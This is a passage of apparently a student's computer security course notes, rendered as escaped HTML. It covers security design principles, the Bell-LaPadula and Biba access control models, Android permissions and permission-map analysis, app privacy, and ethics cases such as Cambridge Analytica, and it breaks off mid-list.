        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Security must be part of design early on
&lt;ul&gt;
&lt;li&gt;Hard to retrofit security, see Windows 95/98&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Android later added user switching and camera was not secure at the beginning&lt;/li&gt;
&lt;li&gt;Least privilege
&lt;ul&gt;
&lt;li&gt;In A1, pwgen has setuid0 when it only needs to write to the /etc/shadow file&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Economy of mechanism&lt;/li&gt;
&lt;li&gt;Open design
&lt;ul&gt;
&lt;li&gt;Avoid security by obscurity&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Complete mediation&lt;/li&gt;
&lt;li&gt;Permission based / fail-safe defaults&lt;/li&gt;
&lt;li&gt;Least common mechanism
&lt;ul&gt;
&lt;li&gt;shared mechanism could be used as covert channel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Ease of use
&lt;ul&gt;
&lt;li&gt;don&amp;rsquo;t want protection mechanism to be difficult to use, nobody will use it or will use it incorrectly&lt;/li&gt;
&lt;li&gt;Android before: grant all permissions in the beginning&lt;/li&gt;
&lt;li&gt;Android now: grant permission one by one based on usage&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;complete-mediation&#34; &gt;Complete Mediation
&lt;span&gt;
    &lt;a href=&#34;#complete-mediation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Complete mediation means that every access to every object should be authorized.&lt;/p&gt;
&lt;h3 id=&#34;default-allow-vs-default-deny&#34; &gt;Default Allow vs Default DEny
&lt;span&gt;
    &lt;a href=&#34;#default-allow-vs-default-deny&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;blacklist&lt;/li&gt;
&lt;li&gt;whitelist&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;access-control&#34; &gt;Access Control
&lt;span&gt;
    &lt;a href=&#34;#access-control&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Mandatory access control (MAC)
&lt;ul&gt;
&lt;li&gt;central authority establishes who can access what&lt;/li&gt;
&lt;li&gt;good for military&lt;/li&gt;
&lt;li&gt;chineses wall,  Bell-LaPadula, biba&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Discretionary access control (DAC)
&lt;ul&gt;
&lt;li&gt;Owners can control&lt;/li&gt;
&lt;li&gt;Grant others access to your home directory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;bell-lapadula&#34; &gt;Bell-LaPadula
&lt;span&gt;
    &lt;a href=&#34;#bell-lapadula&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Can&amp;rsquo;t write down and can&amp;rsquo;t read up. Can&amp;rsquo;t read when not part of the same groups as the access required. Can write to more groups, but not less.&lt;/p&gt;
&lt;p&gt;Example&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sales.txt: Secret and for groups Accounting and Sales
&lt;ul&gt;
&lt;li&gt;Person with Top Secret and Accounting cannot read the file&lt;/li&gt;
&lt;li&gt;Person with Unclassified and Accounting can write the file permissions&lt;/li&gt;
&lt;li&gt;Person with Top Secret cannot write the file&lt;/li&gt;
&lt;li&gt;Person with Accounting and Marketing cannot read nor write the file&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;biba-model&#34; &gt;Biba Model
&lt;span&gt;
    &lt;a href=&#34;#biba-model&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Prevent inappropriate modification of data&lt;/li&gt;
&lt;li&gt;Subjects and objects are ordered by an integrity classification scheme, I(s) and I(o)&lt;/li&gt;
&lt;li&gt;Write access: I(s) ≥&lt;sub&gt;dom&lt;/sub&gt; I(o)&lt;/li&gt;
&lt;li&gt;Read access I(o) ≥&lt;sub&gt;dom&lt;/sub&gt; I(s)&lt;/li&gt;
&lt;li&gt;Subject Low watermark: if subject s reads object o, then I(s) = glb(I(s), I(o)), where glb() = greatest lower bound&lt;/li&gt;
&lt;li&gt;Object Low Watermark Property: if subject s modifies object o, then I(o) = glb(I(s), I(o))&lt;/li&gt;
&lt;li&gt;Integrity of subject/object can only go down, information flows down&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;object-protection&#34; &gt;Object Protection
&lt;span&gt;
    &lt;a href=&#34;#object-protection&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Hidden data
&lt;ul&gt;
&lt;li&gt;Deleting a file will not physically erase file on disk&lt;/li&gt;
&lt;li&gt;Deleting text in MS word might not remove text from document&lt;/li&gt;
&lt;li&gt;Putting black box over text in PDF leaves text in PDF&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;accountability-and-audit&#34; &gt;Accountability and Audit
&lt;span&gt;
    &lt;a href=&#34;#accountability-and-audit&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Granularity of event logging&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;virtualization&#34; &gt;Virtualization
&lt;span&gt;
    &lt;a href=&#34;#virtualization&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Isolation&lt;/li&gt;
&lt;li&gt;Virtual memory: page mapping&lt;/li&gt;
&lt;li&gt;Virtual machines: virtualize I/O devices, file, printers&lt;/li&gt;
&lt;li&gt;A sophisticated rootkit could run the OS in a virtual environment controlled by the rootkit and it would be undetectable&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;mobile-os-security&#34; &gt;Mobile OS Security
&lt;span&gt;
    &lt;a href=&#34;#mobile-os-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;Embedded&lt;/li&gt;
&lt;li&gt;Sensors&lt;/li&gt;
&lt;li&gt;Ubiquitous connectivity (4G / 5G, NFC)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;overview-of-android-os&#34; &gt;Overview of Android OS
&lt;span&gt;
    &lt;a href=&#34;#overview-of-android-os&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;mobile-os-security-mechanisms&#34; &gt;Mobile OS Security Mechanisms
&lt;span&gt;
    &lt;a href=&#34;#mobile-os-security-mechanisms&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Different communication channels (wifi, nfc, cellular, bluetooth)&lt;/li&gt;
&lt;li&gt;Threats: what is stored on the mobile devices&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mobile-app-security&#34; &gt;Mobile App Security
&lt;span&gt;
    &lt;a href=&#34;#mobile-app-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h3 id=&#34;mobile-os-known-vulnerabilities-and-flaws&#34; &gt;Mobile OS Known Vulnerabilities and Flaws
&lt;span&gt;
    &lt;a href=&#34;#mobile-os-known-vulnerabilities-and-flaws&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;WHo could introduce flaws?
&lt;ul&gt;
&lt;li&gt;App developers, tools&lt;/li&gt;
&lt;li&gt;Distributors: googel play, sideloading, alternative markets&lt;/li&gt;
&lt;li&gt;Administrations configure the app&lt;/li&gt;
&lt;li&gt;Vendors of the AndroidOS who can modify the kernel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;android-permissions&#34; &gt;Android Permissions
&lt;span&gt;
    &lt;a href=&#34;#android-permissions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Linux Kernel, Framework / SDK, Applications&lt;/li&gt;
&lt;li&gt;Manifest file for permissions&lt;/li&gt;
&lt;li&gt;Prompt user for granting app permissions&lt;/li&gt;
&lt;li&gt;Runtime Permissions (aka Dangeorus Permissions)&lt;/li&gt;
&lt;li&gt;Allow additional access to restricted data&lt;/li&gt;
&lt;li&gt;Pemrission history&lt;/li&gt;
&lt;li&gt;Special Permissions
&lt;ul&gt;
&lt;li&gt;Allow access to senstive system resources like drawing over other apps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UID is always the same&lt;/li&gt;
&lt;li&gt;Process ID is different on every run&lt;/li&gt;
&lt;li&gt;Binder IPC (inter-process communication)
&lt;ul&gt;
&lt;li&gt;APIs in remote service objects are called as if they are local&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Intents
&lt;ul&gt;
&lt;li&gt;Intents pass a messaging object from a callinga pp to another app&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mobile-framework-security&#34; &gt;Mobile Framework Security
&lt;span&gt;
    &lt;a href=&#34;#mobile-framework-security&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Creating a Permission Map through Dynamic Analysis&lt;/li&gt;
&lt;li&gt;Motivation
&lt;ul&gt;
&lt;li&gt;Lack of understanding Android Access Control&lt;/li&gt;
&lt;li&gt;Incomplete / Missing security docs and specs&lt;/li&gt;
&lt;li&gt;Highly customized ecosystem&lt;/li&gt;
&lt;li&gt;Access control anomolies&lt;/li&gt;
&lt;li&gt;Potential vulnerabilities&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Solution
&lt;ul&gt;
&lt;li&gt;API to Permission Maps&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dynamic Analysis uses techniques
&lt;ul&gt;
&lt;li&gt;Virtual environment or actual device&lt;/li&gt;
&lt;li&gt;Want to look for specific behaviours characterizing a vulnerability or a property&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Static Analysis&lt;/li&gt;
&lt;li&gt;Invoke all APis from unpriviledged apps and detect the checks that protect them&lt;/li&gt;
&lt;li&gt;Apps do not need permission to dsiable its own component&lt;/li&gt;
&lt;li&gt;To disable another users&amp;rsquo; app component, need permission to do that
&lt;ul&gt;
&lt;li&gt;Permission map
&lt;ul&gt;
&lt;li&gt;Need interact accross users for different user id or change related setting for different app&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Static Analysis
&lt;ul&gt;
&lt;li&gt;Identify entry points defined in the framework&lt;/li&gt;
&lt;li&gt;Build control flow grpah of each API&lt;/li&gt;
&lt;li&gt;Perform a reachability analysis on the cfg&lt;/li&gt;
&lt;li&gt;Identify access control enforcement methods
&lt;ul&gt;
&lt;li&gt;Path insentitive: union of all identified permissions&lt;/li&gt;
&lt;li&gt;Path sensitive:
&lt;ul&gt;
&lt;li&gt;Extracting path conditions from entry&lt;/li&gt;
&lt;li&gt;First-order logic formula by disjunction of path conditions&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;app-privacy&#34; &gt;App Privacy
&lt;span&gt;
    &lt;a href=&#34;#app-privacy&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Information Leakage&lt;/li&gt;
&lt;li&gt;IMEI, GPS coordinates, SMS messages, banking information&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ethics-and-laws&#34; &gt;Ethics and Laws
&lt;span&gt;
    &lt;a href=&#34;#ethics-and-laws&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;Laws, morality, and theifs are all beliefs, claims, rules, and norms about how we should live and behave&lt;/p&gt;
&lt;h3 id=&#34;cambridge-analytica&#34; &gt;Cambridge Analytica
&lt;span&gt;
    &lt;a href=&#34;#cambridge-analytica&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Facebook launched open graph in 2010
&lt;ul&gt;
&lt;li&gt;External developers can request access to their data and their friends&amp;rsquo; data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;In 2013, an app “thisisyourdigitallife” approached to almost
300,000 users and paid them to take a psychological test.&lt;/li&gt;
&lt;li&gt;In 2014, Facebook adapted its rules to limit a developer’s access to user data, especially the friends’ data&lt;/li&gt;
&lt;li&gt;In 2015, The Guardian reported that Cambridge Analytica was
helping Ted Cruz’s presidential campaign. FB acknowledged the data leak and argued that they have legally pressured Cambridge Analytica to remove all of the data they had improperly acquired&lt;/li&gt;
&lt;li&gt;In 2016, Cambridge Analytica was responsible for the “Defeat
Crooked Hilary” video campaign on FB (assisting Trump’s team).&lt;/li&gt;
&lt;li&gt;Exposed in 2018 by The Guardian because of whistle blower Christopher Wylie. 50 million to 87 million users estimated  to been impacted.&lt;/li&gt;
&lt;li&gt;Slew of fines. UK UCO 2018: 500,000 pounds, FTC 2019: $5B, SEC 2019: $100M&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;linux-kernel-university-of-minnesota&#34; &gt;Linux Kernel University of Minnesota
&lt;span&gt;
    &lt;a href=&#34;#linux-kernel-university-of-minnesota&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Intentionally adding buggy code and not informing the reviewer beforehand&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;what-is-law&#34; &gt;What is Law
&lt;span&gt;
    &lt;a href=&#34;#what-is-law&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Formal rules governing society&lt;/li&gt;
